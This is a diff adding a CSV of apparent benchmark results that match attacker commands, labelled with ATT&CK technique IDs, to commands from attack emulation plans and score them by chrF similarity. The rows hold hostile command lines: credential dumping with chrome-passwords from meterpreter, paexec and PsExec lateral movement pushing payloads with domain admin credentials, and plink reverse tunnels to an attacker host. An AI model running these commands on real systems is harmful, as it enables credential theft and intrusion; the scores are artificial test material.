@@ -1,0 +1,10 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",59.855,True
+command_paexec_TA0011_T1219.txt,paexec,paexec -i -c <dll_name>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",16.877,True
+command_paexec_TA0011_T1219.txt,paexec,paexec -h -i -c <dll_name>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",17.01,True
+command_paexec_TA0011_T1219.txt,paexec,paexec -l -i -c <dll_name>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",17.01,True
+command_plink_TA0011_T1071.txt,plink,"plink.exe -i ""<private_key_file>"" <attacker_ssh_user>@<server_ip> -R 80:localhost:80","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",50.614,True
+command_plink_TA0011_T1071.txt,plink,"plink.exe -C -i ""<private_key_file>"" <attacker_ssh_user>@<server_ip> -X -A -t -1 -4","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",41.898,True
+command_plink_TA0011_T1071.txt,plink,"plink.exe -no-sanitise-stdout -i ""<private_key_file>"" <attacker_ssh_user>@<server_ip> -R 443:localhost:443 -X -a","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`",41.988,True
+command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -s -nobanner -accepteula -c <file_path>\cyzfc.dat,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",23.917,True
